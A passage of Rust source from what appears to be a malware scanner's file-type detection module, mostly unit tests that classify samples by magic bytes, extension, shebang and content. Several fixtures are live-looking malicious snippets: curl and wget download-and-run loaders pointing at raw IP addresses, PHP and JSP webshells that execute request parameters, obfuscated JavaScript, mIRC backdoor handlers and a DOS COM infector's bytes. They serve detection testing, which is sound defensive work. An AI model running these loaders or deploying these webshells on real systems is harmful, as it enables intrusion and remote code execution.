pub fn detect_content(data: &[u8]) -> Option<Detection> {
    let path = Path::new("");
    magic::detect_from_content(path, data).map(|(file_type, source)| Detection {
        file_type,
        source,
        ext_match: ExtensionMatch::Consistent,
    })
}

/// Detect file type from path/extension alone.
///
/// Does not examine file content.
#[must_use]
pub fn detect_path(path: &Path) -> Option<Detection> {
    ext::detect_from_path(path).map(|file_type| Detection {
        file_type,
        source: if ext::is_filename_match(path) {
            DetectionSource::Filename
        } else {
            DetectionSource::Extension
        },
        ext_match: ExtensionMatch::Consistent,
    })
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;

    // Helper: assert detection result
    fn assert_detect(path: &str, data: &[u8], expected: FileType) {
        let Some(det) = detect(Path::new(path), data) else {
            panic!("expected {expected:?} for {path}, got None");
        };
        assert_eq!(det.file_type, expected, "wrong type for {path}");
    }

    fn assert_ext(path: &str, expected: FileType) {
        assert_detect(path, b"x = 1\n", expected);
    }

    // ── Binary formats (magic bytes) ─────────────────────────────────

    #[test]
    fn macho_magic() {
        assert_detect(
            "binary",
            &[0xFE, 0xED, 0xFA, 0xCE, 0, 0, 0, 0],
            FileType::MachO,
        );
        assert_detect(
            "binary",
            &[0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0],
            FileType::MachO,
        );
        // Fat binary (nfat_arch=2, not Java class range)
        assert_detect(
            "binary",
            &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2],
            FileType::MachO,
        );
    }

    #[test]
    fn elf_magic() {
        assert_detect(
            "a.out",
            b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
            FileType::Elf,
        );
    }

    #[test]
    fn elf_mismatch() {
        let data = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let det = detect(Path::new("malware.jpg"), data).unwrap();
        assert_eq!(det.file_type, FileType::Elf);
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Jpeg));
    }

    #[test]
    fn pe_magic() {
        assert_detect("app.exe", b"MZ\x90\x00\x03\x00\x00\x00", FileType::Pe);
    }

    #[test]
    fn pe_extension_is_consistent() {
        let det = detect(Path::new("app.exe"), b"MZ\x90\x00\x03\x00\x00\x00").unwrap();
        assert_eq!(det.file_type, FileType::Pe);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn pe_mismatch() {
        let det = detect(Path::new("font.woff2"), b"MZ\x90\x00\x03\x00\x00\x00").unwrap();
        assert_eq!(det.file_type, FileType::Pe);
        assert!(det.extension_mismatch());
    }

    // ── AppleDouble (._<name>) resource forks ────────────────────────────
    // Regression guard: a benign Composer tarball lit up at suspicious
    // because cleave classified macOS resource forks (`._foo.php`) as PHP
    // and then ran obfuscation traits over their binary bodies. Magic-byte
    // detection must return Unknown so `is_program()` skips analysis.

    #[test]
    fn appledouble_magic_returns_unknown() {
        // AppleDouble: 00 05 16 07 + version + filler + entry table.
        // 16 bytes is enough for the magic + version slot tested below.
        let data = b"\x00\x05\x16\x07\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let det = detect(Path::new("._foo.php"), data).unwrap();
        assert_eq!(det.file_type, FileType::Unknown);
        // Magic detection must win over the `.php` extension fallback —
        // otherwise the body gets analyzed as PHP and entropy traits fire.
        assert!(
            !det.file_type.is_program(),
            "AppleDouble bodies must be skipped by is_program() so cleave doesn't \
             analyze them; otherwise benign tarballs with macOS resource forks \
             score as suspicious"
        );
    }

    #[test]
    fn appledouble_magic_overrides_php_extension() {
        let data = b"\x00\x05\x16\x07\x00\x02\x00\x00rest_is_binary_metadata";
        let det = detect(Path::new("wundii-flowcrafter/._index.php"), data).unwrap();
        assert_eq!(det.file_type, FileType::Unknown);
        assert_eq!(det.source, DetectionSource::Magic);
    }

    #[test]
    fn null_byte_without_appledouble_magic_does_not_match() {
        // Negative: a file that starts with 0x00 but isn't AppleDouble
        // (e.g. raw padded data) must not be misclassified as Unknown via
        // this path. Falls through to extension/heuristic detection.
        let data = b"\x00\x00\x00\x00more null bytes here";
        let det = detect(Path::new("padding.dat"), data);
        // .dat extension maps to Data; the 0x00 arm must not have intercepted.
        assert!(
            det.is_none() || det.unwrap().file_type != FileType::Unknown,
            "unrelated 0x00-leading bytes must not be claimed as AppleDouble"
        );
    }

    // ── Java ─────────────────────────────────────────────────────────

    #[test]
    fn java_class_magic() {
        assert_detect(
            "Main.class",
            &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52],
            FileType::JavaClass,
        );
    }

    /// `.class` and `.dex` are defined by their magic. A name with no magic
    /// behind it is not the format; the body decides.
    #[test]
    fn magic_defined_names_need_their_magic() {
        assert_detect("Foo.class", b"x = 1\n", FileType::Text);
        assert_detect("classes.dex", b"x = 1\n", FileType::Text);
        assert_detect(
            "Exploit.JS.RealPlr.ko",
            b"<html><body><script>var a=1;</script></body></html>\n",
            FileType::Html,
        );
    }

    #[test]
    fn java_source_by_ext() {
        assert_ext("Foo.java", FileType::Java);
    }

    #[test]
    fn jar_pk_magic() {
        assert_detect("lib.jar", b"PK\x03\x04jar content", FileType::Jar);
    }

    #[test]
    fn jar_by_ext() {
        assert_detect("lib.war", b"PK\x03\x04war content", FileType::Jar);
    }

    #[test]
    fn xpi_by_ext_routes_to_xpi_not_zip() {
        // ZIP magic + .xpi extension → FileType::Xpi (distinct from generic Zip).
        assert_detect("addon.xpi", b"PK\x03\x04xpi content", FileType::Xpi);
    }

    #[test]
    fn xpi_classified_as_archive() {
        assert!(FileType::Xpi.is_archive());
    }

    #[test]
    fn whl_by_ext_routes_to_whl_not_zip() {
        assert_detect(
            "pkg-1.0-py3-none-any.whl",
            b"PK\x03\x04wheel content",
            FileType::Whl,
        );
    }

    #[test]
    fn whl_classified_as_archive() {
        assert!(FileType::Whl.is_archive());
    }

    #[test]
    fn opc_package_archives_do_not_route_to_ooxml() {
        let data = b"PK\x03\x04[Content_Types].xml";
        for name in [
            "app.msix",
            "app.appx",
            "bundle.msixbundle",
            "bundle.appxbundle",
            "comic.cbz",
        ] {
            assert_detect(name, data, FileType::Zip);
        }
    }

    // ── Python ───────────────────────────────────────────────────────

    #[test]
    fn python_by_ext() {
        assert_ext("script.py", FileType::Python);
    }

    #[test]
    fn python_by_shebang() {
        assert_detect(
            "mystery",
            b"#!/usr/bin/env python3\nimport sys\n",
            FileType::Python,
        );
    }

    #[test]
    fn python_by_import_heuristic_without_filename() {
        assert_detect(
            "mystery",
            b"import os, subprocess, tempfile, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
            FileType::Python,
        );
    }

    #[test]
    fn python_bytecode_magic() {
        assert_detect(
            "mod.pyc",
            &[0x42, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0],
            FileType::PythonBytecode,
        );
    }

    #[test]
    fn python_bytecode_by_ext() {
        assert_ext("mod.pyc", FileType::PythonBytecode);
    }

    // ── JavaScript / TypeScript ──────────────────────────────────────

    #[test]
    fn javascript_by_ext() {
        assert_ext("app.js", FileType::JavaScript);
        assert_ext("app.mjs", FileType::JavaScript);
        assert_ext("app.cjs", FileType::JavaScript);
        assert_ext("app.jsx", FileType::JavaScript);
    }

    #[test]
    fn javascript_by_shebang() {
        assert_detect(
            "tool",
            b"#!/usr/bin/env node\nconsole.log('hi');\n",
            FileType::JavaScript,
        );
    }

    #[test]
    fn javascript_runtime_shebang_on_typescript_stays_typescript() {
        for shebang in [
            "#!/usr/bin/env node",
            "#!/usr/bin/env -S deno run",
            "#!/usr/bin/env bun",
        ] {
            let data = format!("{shebang}\nconst x: number = 1;\n");
            let det = detect(Path::new("cli.ts"), data.as_bytes()).unwrap();
            assert_eq!(det.file_type, FileType::TypeScript, "{shebang}");
            assert_eq!(det.source, DetectionSource::Shebang, "{shebang}");
            assert!(!det.extension_mismatch(), "{shebang}");
        }
        // Without the extension, the runtime is all there is to go on.
        assert_detect(
            "cli",
            b"#!/usr/bin/env node\nconst x = 1;\n",
            FileType::JavaScript,
        );
    }

    #[test]
    fn typescript_by_ext() {
        assert_ext("app.ts", FileType::TypeScript);
        assert_ext("app.tsx", FileType::TypeScript);
    }

    // ── Shell ────────────────────────────────────────────────────────

    #[test]
    fn shell_by_ext() {
        assert_ext("run.sh", FileType::Shell);
        assert_ext("run.bash", FileType::Shell);
        assert_ext("run.zsh", FileType::Shell);
    }

    #[test]
    fn shell_by_shebang() {
        assert_detect("mystery", b"#!/bin/bash\necho hello\n", FileType::Shell);
        assert_detect("mystery", b"#!/bin/sh\necho hello\n", FileType::Shell);
        assert_detect(
            "mystery",
            b"#!/usr/bin/env zsh\necho hello\n",
            FileType::Shell,
        );
    }

    #[test]
    fn script_extension_overrides_shell_shebang_juke() {
        // .py with a bash shebang: the shebang is a static-analysis-evasion
        // juke, the extension is what the user/loader treats the file as.
        // Trust the extension; flag the mismatch.
        let det = detect(Path::new("script.py"), b"#!/bin/bash\necho hello\n").unwrap();
        assert_eq!(det.file_type, FileType::Python);
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Shell));
    }

    #[test]
    fn js_extension_overrides_bash_shebang_juke() {
        // npm xmlrpc / xmrdropper pattern.
        let det = detect(
            Path::new("validator.js"),
            b"#!/bin/bash\nconst fs = require('fs');\n",
        )
        .unwrap();
        assert_eq!(det.file_type, FileType::JavaScript);
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Shell));
    }

    #[test]
    fn protobuf_schema_extension_prevents_kotlin_heuristic() {
        let data = br#"syntax = "proto3";

package c2;

service C2Service {
  rpc BeaconStream(stream BeaconMessage) returns (stream CommandMessage);
  rpc SendCommand(SendCommandRequest) returns (SendCommandResponse);
}

message CommandMessage {
  string command_id = 1;
  string command = 2;
  repeated string args = 3;
}
"#;
        let det = detect(Path::new("c2.proto"), data).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn shell_extension_with_shell_shebang_no_juke() {
        // .sh with bash shebang: not a juke, no override.
        let det = detect(Path::new("script.sh"), b"#!/bin/bash\necho hello\n").unwrap();
        assert_eq!(det.file_type, FileType::Shell);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn shell_one_liner_without_shebang_or_ext() {
        assert_detect(
            "Sifuvuziw",
            b"cd $TMPDIR && curl -O http://144.31.236.51/Dynamic && xattr -c ./Dynamic && chmod +x ./Dynamic && ./Dynamic\n",
            FileType::Shell,
        );
    }

    #[test]
    fn shell_multarch_wget_loader_without_shebang_or_ext() {
        let data = b"cd /tmp || /var/tmp; rm avtech.arm5; wget http://193.243.147.115/avtech.arm5; chmod 777 avtech.arm5; ./avtech.arm5\n\
cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; chmod 777 avtech.arm7; ./avtech.arm7\n";
        assert_detect("avTECH", data, FileType::Shell);
    }

    #[test]
    fn shell_empty_falls_back_to_ext() {
        let det = detect(Path::new("run.sh"), b"").unwrap();
        assert_eq!(det.file_type, FileType::Shell);
        assert_eq!(det.source, DetectionSource::Extension);
    }

    // ── Batch ────────────────────────────────────────────────────────

    #[test]
    fn batch_by_ext() {
        assert_ext("run.bat", FileType::Batch);
        assert_ext("run.cmd", FileType::Batch);
    }

    // ── JCL ──────────────────────────────────────────────────────────

    #[test]
    fn jcl_by_ext() {
        assert_ext("run.jcl", FileType::Jcl);
    }

    // ── VBScript ─────────────────────────────────────────────────────

    #[test]
    fn vbs_by_ext() {
        assert_ext("script.vbs", FileType::Vbs);
        assert_ext("script.vbe", FileType::Vbs);
        assert_ext("script.wsf", FileType::Vbs);
    }

    // ── Go / Rust / Swift / Objective-C / Zig / Elixir ──────────────

    #[test]
    fn go_by_ext() {
        assert_ext("main.go", FileType::Go);
    }

    #[test]
    fn rust_by_ext() {
        assert_ext("lib.rs", FileType::Rust);
    }

    #[test]
    fn swift_by_ext() {
        assert_ext("app.swift", FileType::Swift);
    }

    #[test]
    fn objc_by_ext() {
        // Plain C is Objective-C too; with no directive to score, C statement
        // structure keeps the name.
        let c = b"extern void GoFunc();\nint main(int argc, char **argv) {\n\tGoFunc();\n}\n";
        assert_detect("view.m", c, FileType::ObjectiveC);
        assert_detect("view.mm", c, FileType::ObjectiveC);
    }

    /// A `.m` of many `#include` lines scores heavily for C, and a couple of
    /// directives still make it Objective-C.
    #[test]
    fn objc_directives_beat_c_includes() {
        let mut src = b"#include <stdio.h>\n".repeat(12);
        src.extend_from_slice(
            b"#import <Foundation/Foundation.h>\n@interface Foo : NSObject\n@end\n",
        );
        assert_detect("Foo.mm", &src, FileType::ObjectiveC);
    }

    /// Text with neither a directive nor C structure is not Objective-C
    /// because of its last letter: a MATLAB script, a hosts file.
    #[test]
    fn m_without_objc_or_c_structure_is_text() {
        assert_detect(
            "genherm.m",
            b"% Hermite points\nx = linspace(0, 1, 10)\ndisp(x)\n",
            FileType::Text,
        );
        assert_detect(
            "Trojan.Win32.Qhost.m",
            b"127.0.0.1 ruworld.com\r\n127.0.0.1 example.net\r\n",
            FileType::Text,
        );
    }

    /// A batch file under a Perl test name. Perl's `.t` has nothing to say
    /// against `@echo off` when the body carries no Perl at all.
    #[test]
    fn batch_body_contradicts_perl_extension() {
        assert_detect(
            "Trojan.BAT.Looper.t",
            b"@echo off\r\n:loop\r\ngoto loop\r\n",
            FileType::Batch,
        );
        assert_detect(
            "Virus.BAT.Silly.m",
            b"if \"%1==\" for %%i in (*.b*) do call %0 %%i\r\n",
            FileType::Batch,
        );
    }

    /// `start WScript.exe x.vbs` is a batch line launching the host.
    #[test]
    fn wscript_exe_is_not_vbscript() {
        let bat = b"@echo off\r\nif exist sys32.vbs start WScript.exe sys32.vbs&exit\r\nif exist a.vbs start WScript.exe a.vbs&exit\r\n";
        assert_detect("Worm.VBS.Autorun.m", bat, FileType::Batch);
    }

    /// mIRC handlers at any level and for any event, and mIRC's saved-script INI.
    #[test]
    fn mirc_event_headers_and_saved_script() {
        assert_detect(
            "Backdoor.IRC.Cloner.m",
            b"on 10:TEXT:*:*:{\n  if ($1 == !quit) { /quit }\n}\n",
            FileType::Mirc,
        );
        assert_detect(
            "Backdoor.IRC.CWSBD",
            b"on *:start: {\n  socklisten door 37173\n}\n",
            FileType::Mirc,
        );
        assert_detect(
            "IRC-Worm.IRC.TooLame.a",
            b"[script]\r\nn0=on 1:LOAD: { .ial on }\r\nn1=on 1:UNLOAD: { .quit }\r\n",
            FileType::Mirc,
        );
        // A VBScript that writes a mIRC script quotes the header mid-line.
        assert_detect(
            "Email-Worm.VBS.LoveLetter.bb",
            b"On Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nscriptini.WriteLine \"n0=on 1:JOIN:#:{\"\nWScript.Echo 1\n",
            FileType::Vbs,
        );
    }

    /// An alias file written with mIRC identifiers is mIRC even when it
    /// writes batch lines into the file it drops.
    #[test]
    fn mirc_alias_file_is_mirc_not_batch() {
        let src = b"alias xspread {\r\n  .write x-.bat net view > x-.txt\r\n  .write x-.bat @echo off\r\n  .timersx 1 20 xcopy1\r\n}\r\nalias xcopy1 {\r\n  if ($lines(x-.txt) < 6) { halt }\r\n}\r\n";
        assert_detect("Trojan.IRC.Nullpy.a", src, FileType::Mirc);
        // ircII shares the brace form, but not mIRC's identifiers.
        assert_ne!(
            detect(Path::new("x.irc"), b"alias hi {\n  echo hello\n}\n").map(|d| d.file_type),
            Some(FileType::Mirc)
        );
    }

    /// A 27-byte COM infector is too short for the percentage alone, and a
    /// zero-filled header is NUL in both lanes -- not UTF-16 text.
    #[test]
    fn short_and_nul_padded_binaries_are_not_source() {
        let com = [
            0xb4, 0x4e, 0xba, 0x10, 0x01, 0xcd, 0x21, 0xb4, 0x3c, 0xba, 0x9e, 0x00, 0xcd, 0x21,
            0xb2, 0x1b, 0x2a, 0x2e, 0x43, 0x4f, 0x4d, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf1,
        ];
        assert_detect("Virus.DOS.Trivial.27.m", &com, FileType::DosCom);
        let mut jet = vec![0x00u8, 0x01, 0x00, 0x00];
        jet.extend_from_slice(b"Standard Jet DB\0");
        jet.resize(2048, 0);
        assert_detect("Virus.MSAccess.Poison.c", &jet, FileType::Data);
    }

    #[test]
    fn markdown_named_javascript_is_javascript() {
        let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2,_0x20e97b){\n\
const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
function loadBytenode(){return require('bytenode');}\n})();\n";
        assert_detect("CHANGELOG.md", js, FileType::JavaScript);
        let readme = b"# Notes\n\nInstall with `npm install foo`.\n\nSee the docs.\n";
        assert_detect("README.md", readme, FileType::Markdown);
    }

    #[test]
    fn txt_php_webshell_overrides_text_extension() {
        let php = b"<?\n$cmd = stripslashes($cmd);\nsystem($cmd);\n";
        assert_detect("Php_Backdoor.txt", php, FileType::Php);
        // The saved webshell also embeds `document.write`, which used to tie
        // JavaScript inside the sniff window.
        let saved = include_bytes!("testdata/php-backdoor.txt");
        assert_detect("Php_Backdoor.txt", saved, FileType::Php);
    }

    #[test]
    fn jsp_page_directive_is_jsp() {
        let bom = b"\xef\xbb\xbf<%@page pageEncoding=\"utf-8\"%>\n<%@page import=\"java.io.*\"%>\n<%!\nString pw = \"x\";\n%>\n";
        assert_detect("date.jsp.txt", bom, FileType::Jsp);
        let spaced =
            b"<%@ page language=\"java\" contentType=\"text/html\"%>\n<% out.println(1); %>\n";
        assert_detect("page.jsp", spaced, FileType::Jsp);
        // An HTML prologue does not change what a `.jsp` is.
        assert_detect("page.jsp", b"<html><body>hi</body></html>", FileType::Jsp);
        // A Java source file that quotes a directive stays Java.
        assert_detect(
            "App.java",
            b"<%@page pageEncoding=\"utf-8\"%>\nclass App {}\n",
            FileType::Java,
        );
        // A saved browser copy opens with a doctype. The page directive a few
        // lines later is still the type.
        let saved = b"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n\
<HTML><HEAD><TITLE>shell</TITLE></HEAD>\n\
<%@ page contentType=\"text/html; charset=GBK\" %>\n\
<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n";
        assert_detect("shell.jsp.txt", saved, FileType::Jsp);
        assert_detect(
            "base64.jspx.txt",
            b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n\
<jsp:scriptlet>String s;</jsp:scriptlet>\n</jsp:root>\n",
            FileType::Jsp,
        );
        assert_detect(
            "App.java",
            b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\">\nclass App {}\n",
            FileType::Java,
        );
        assert_detect(
            "page.html",
            b"<!DOCTYPE html>\n<html><body>hi</body></html>\n",
            FileType::Html,
        );
    }

    #[test]
    fn asp_directive_is_asp() {
        let classic = b"<%@ Language=VBScript %>\n<%\nFunction Foo()\nEnd Function\n%>\n";
        assert_detect("aspydrv.asp.txt", classic, FileType::Asp);
        let aspx = b"<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\n</script>\n";
        assert_detect("shell.aspx", aspx, FileType::Asp);
        assert_detect("renamed.txt", aspx, FileType::Asp);
    }

    #[test]
    fn coldfusion_tex_yara_postscript_and_irc_scripts() {
        assert_detect("p.cfm", b"<cfset x = 1>\n", FileType::Cfml);
        assert_detect("p.txt", b"<cfoutput>#x#</cfoutput>\n", FileType::Cfml);
        assert_detect("a.tex", b"hello\n", FileType::Tex);
        assert_detect("notes.txt", b"\\documentclass{article}\n", FileType::Tex);
        // `.cls` is also Visual Basic. The body decides.
        assert_detect("article.cls", b"\\ProvidesClass{article}\n", FileType::Tex);
        let vb_cls = detect(Path::new("Module.cls"), b"VERSION 1.0 CLASS\n");
        assert_ne!(vb_cls.map(|d| d.file_type), Some(FileType::Tex));
        let yara = b"rule Demo {\nstrings:\n$a = \"x\"\ncondition:\ntrue\n}\n";
        assert_detect("r.yar", yara, FileType::Yara);
        assert_detect("rules.txt", yara, FileType::Yara);
        assert_detect("doc.ps", b"%!PS-Adobe-3.0\n", FileType::PostScript);
        assert_detect("bare.ps", b"not a header\n", FileType::PostScript);
        assert_detect("bot.mrc", b"alias x echo hi\n", FileType::Mirc);
        assert_detect("shell.m", b"on *:TEXT:*:echo hi\n", FileType::Mirc);
        assert_detect("shell.lua", b"ON 1:JOIN:*:{\n}\n", FileType::Mirc);
        assert_detect("hooks.ircii", b"alias x echo hi\n", FileType::IrcII);
        assert_detect("rc.txt", b"^on ^join \"*\" {\n}\n", FileType::IrcII);
    }

    #[test]
    fn prose_txt_stays_text() {
        let note = b"This is a note about the meeting. We should let the team decide next week.\n";
        assert_detect("notes.txt", note, FileType::Text);
        let license = b"Modified Version, except to acknowledge the contribution.\n\
Original or Modified Versions may be sold by itself.\n";
        assert_detect("OFL.txt", license, FileType::Text);
        let guide = b"If you discover a problem, post a message and let the rest of us know.\n\
Coordinate with the Applet Maintainer before sweeping changes.\n";
        assert_detect("contributing.txt", guide, FileType::Text);
    }

    #[test]
    fn php4_agent_without_known_extension_is_php() {
        let php = b"<?\nclass backdoor {\n  var $pwd;\n  var $shell;\n  function shell() {\n    echo $_SERVER['PHP_SELF'];\n  }\n}\n";
        assert_detect("Backdoor.PHP.Agent.ap", php, FileType::Php);
    }

    #[test]
    fn php_webshell_with_bb_extension_is_php() {
        let php = b"<?\n@$output = system($_POST['command']);\n";
        assert_detect("Backdoor.PHP.Agent.bb", php, FileType::Php);
    }

    #[test]
    fn babashka_script_keeps_bb_extension() {
        let bb = b"(defn main []\n  (println \"hi\"))\n";
        assert_detect("script.bb", bb, FileType::Clojure);
    }

    #[test]
    fn perl_source_with_m_extension_is_perl() {
        let perl = b"use strict;\nmy $port = 6667;\nprint $sock \"NICK $nick\\r\\n\";\n";
        assert_detect("Scanner.m", perl, FileType::Perl);
    }

    #[test]
    fn objective_c_source_keeps_m_extension() {
        let objc =
            b"#import <Foundation/Foundation.h>\n@interface View : NSObject\n- (void)draw;\n@end\n";
        assert_detect("View.m", objc, FileType::ObjectiveC);
    }

    #[test]
    fn dos_com_with_source_extension_is_data() {
        let mut com = vec![0x90u8; 80];
        for i in (0..80).step_by(8) {
            com[i] = 0x01;
        }
        com[11] = 0xCD;
        com[12] = 0x21;
        assert_detect("Burger.m", &com, FileType::DosCom);
        assert_detect("Trivial.45.t", &com, FileType::DosCom);
        assert_detect("prog.com", &com, FileType::DosCom);
        assert_detect("prog.com", b"MZ\x90\x00", FileType::Pe);
    }

    /// Corpora name samples by hash or give them a generic data suffix, so a
    /// COM program there has no `.com`. It was Unknown / Data, which no DOS
    /// rule walks.
    #[test]
    fn dos_com_without_a_telling_name_is_dos_com() {
        let mut com = vec![0x90u8; 80];
        for i in (0..80).step_by(8) {
            com[i] = 0x01;
        }
        com[11] = 0xCD;
        com[12] = 0x21;
        assert_detect(
            "0f3a9c1e2b7d4f6a8e5c3b1a9d7f5e3c1b9a7d5f3e1c9b7a5d3f1e9c7b5a3d1f",
            &com,
            FileType::DosCom,
        );
        assert_detect("prog", &com, FileType::DosCom);
        assert_detect("prog.bin", &com, FileType::DosCom);
    }

    /// Size alone is not enough: a small binary with no `INT 21h` near the
    /// front stays what it was, so an arbitrary short blob is not a program.
    #[test]
    fn small_binary_without_int21_is_not_dos_com() {
        let mut blob = vec![0x90u8; 80];
        for i in (0..80).step_by(8) {
            blob[i] = 0x01;
        }
        assert_detect("prog.bin", &blob, FileType::Data);
        let det = detect(Path::new("prog"), &blob);
        assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
    }

    /// The same bytes past the 64 KiB COM limit are not a COM program: that is
    /// how a ciphertext or firmware blob with a chance `CD 21` stays data.
    #[test]
    fn oversized_blob_with_int21_is_not_dos_com() {
        let mut blob = vec![0x01u8; heuristics::DOS_COM_MAX_SIZE + 1];
        blob[11] = 0xCD;
        blob[12] = 0x21;
        assert_detect("prog.bin", &blob, FileType::Data);
        let det = detect(Path::new("prog"), &blob);
        assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
    }

    #[test]
    fn utf16_source_with_m_extension_stays_objective_c() {
        let mut utf16 = vec![0xFFu8, 0xFE];
        for b in b"// objc comment\n".repeat(8) {
            utf16.push(b);
            utf16.push(0);
        }
        assert_detect("View.m", &utf16, FileType::ObjectiveC);
    }

    #[test]
    fn zig_by_ext() {
        assert_ext("main.zig", FileType::Zig);
    }

    #[test]
    fn elixir_by_ext() {
        assert_ext("app.ex", FileType::Elixir);
        assert_ext("test.exs", FileType::Elixir);
    }

    // ── Ruby ─────────────────────────────────────────────────────────

    #[test]
    fn ruby_by_ext() {
        assert_ext("app.rb", FileType::Ruby);
    }

    #[test]
    fn ruby_by_shebang() {
        assert_detect("tool", b"#!/usr/bin/env ruby\nputs 'hi'\n", FileType::Ruby);
    }

    // ── PHP ──────────────────────────────────────────────────────────

    #[test]
    fn php_by_ext() {
        assert_ext("page.php", FileType::Php);
    }

    #[test]
    fn php_by_opening_tag() {
        assert_detect("page", b"<?php\necho 'hello';\n", FileType::Php);
    }

    #[test]
    fn php_by_shebang() {
        assert_detect(
            "tool",
            b"#!/usr/bin/env php\n<?php echo 1;\n",
            FileType::Php,
        );
    }

    // ── Perl ─────────────────────────────────────────────────────────

    #[test]
    fn perl_by_ext() {
        assert_ext("script.pl", FileType::Perl);
        assert_ext("module.pm", FileType::Perl);
    }

    #[test]
    fn cpan_makefile_pl_is_perl() {
        for name in ["Makefile.PL", "makefile.pl", "MAKEFILE.PL", "Build.PL"] {
            assert_ext(name, FileType::Perl);
            assert_detect(
                &format!("distribution/{name}"),
                b"use ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Example');\n",
                FileType::Perl,
            );
        }
        for name in ["Makefile", "Makefile.debug", "Makefile.in", "GNUmakefile"] {
            assert_detect(name, b"all:\n\techo hi\n", FileType::Makefile);
        }
    }

    #[test]
    fn perl_by_shebang() {
        assert_detect("tool", b"#!/usr/bin/perl\nuse strict;\n", FileType::Perl);
    }

    // ── Lua ──────────────────────────────────────────────────────────

    #[test]
    fn lua_by_ext() {
        assert_ext("script.lua", FileType::Lua);
    }

    #[test]
    fn lua_by_shebang() {
        assert_detect("tool", b"#!/usr/bin/env lua\nprint('hi')\n", FileType::Lua);
    }

    // ── C# ───────────────────────────────────────────────────────────

    #[test]
    fn csharp_by_ext() {
        assert_ext("App.cs", FileType::CSharp);
    }

    // ── PowerShell ───────────────────────────────────────────────────

    #[test]
    fn powershell_by_ext() {
        assert_ext("script.ps1", FileType::PowerShell);
        assert_ext("module.psm1", FileType::PowerShell);
    }

    // ── Groovy / Scala ───────────────────────────────────────────────

    #[test]
    fn groovy_by_ext() {
        assert_ext("build.groovy", FileType::Groovy);
        assert_ext("build.gradle", FileType::Groovy);
    }

    #[test]
    fn scala_by_ext() {
        assert_ext("App.scala", FileType::Scala);
    }

    #[test]
    fn sc_markup_is_html_and_scala_script_stays_scala() {
        assert_detect(
            "Trojan.sc",
            b" <script>function x(){return 1}</script>\n",
            FileType::Html,
        );
        assert_detect(
            "worksheet.sc",
            b"import scala.util._\nprintln(1)\n",
            FileType::Scala,
        );
        assert_detect(
            "App.scala",
            b"<script>not really</script>\nobject App\n",
            FileType::Scala,
        );
    }

    #[test]
    fn ex_variant_letter_yields_to_a_leading_mark() {
        assert_detect(
            "Trojan.BAT.Agent.ex",
            b"@echo       off\r\ncopy a b\r\n",
            FileType::Batch,
        );
        assert_detect(
            "Backdoor.ASP.Ace.ex",
            b"<%@ LANGUAGE = VBScript.Encode %>\r\n<%\r\n",
            FileType::Asp,
        );
        assert_detect(
            "Exploit.JS.RealPlr.ex",
            b"<sCrIpT lAnGuAgE=\"jAvAsCrIpT\">\r\n",
            FileType::Html,
        );
        let mut utf16 = vec![0xff, 0xfe];
        for b in b"<!DOCTYPE HTML" {
            utf16.push(*b);
            utf16.push(0);
        }
        assert_detect("Trojan.JS.Agent.ex", &utf16, FileType::Html);
        assert_detect(
            "revshell.ex",
            b"defmodule Revshell do\n  def run do\n  end\nend\n",
            FileType::Elixir,
        );
        assert_detect("tool.exs", b"@echo off\r\n", FileType::Elixir);
    }

    // ── C/C++ ────────────────────────────────────────────────────────

    #[test]
    fn c_by_ext() {
        assert_ext("main.c", FileType::C);
        assert_ext("main.h", FileType::C);
        assert_ext("main.cpp", FileType::C);
        assert_ext("main.hpp", FileType::C);
    }

    // ── Manifests ────────────────────────────────────────────────────

    #[test]
    fn package_json() {
        let det = detect(Path::new("package.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageJson);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    #[test]
    fn package_lock_json() {
        let det = detect(Path::new("package-lock.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageLockJson);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    #[test]
    fn composer_json() {
        assert_ext("composer.json", FileType::ComposerJson);
    }

    #[test]
    fn cargo_toml() {
        assert_ext("Cargo.toml", FileType::CargoToml);
    }

    #[test]
    fn pyproject_toml() {
        assert_ext("pyproject.toml", FileType::PyProjectToml);
    }

    #[test]
    fn vsix_manifest() {
        assert_detect("extension.vsixmanifest", b"<xml/>", FileType::VsixManifest);
    }

    #[test]
    fn chrome_manifest() {
        let data = br#"{"manifest_version": 3, "permissions": ["storage"]}"#;
        assert_detect("manifest.json", data, FileType::ChromeManifest);
    }

    #[test]
    fn github_actions_workflow() {
        let det = detect(Path::new(".github/workflows/ci.yml"), b"name: CI\n").unwrap();
        assert_eq!(det.file_type, FileType::GithubActions);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    #[test]
    fn github_actions_workflow_by_content() {
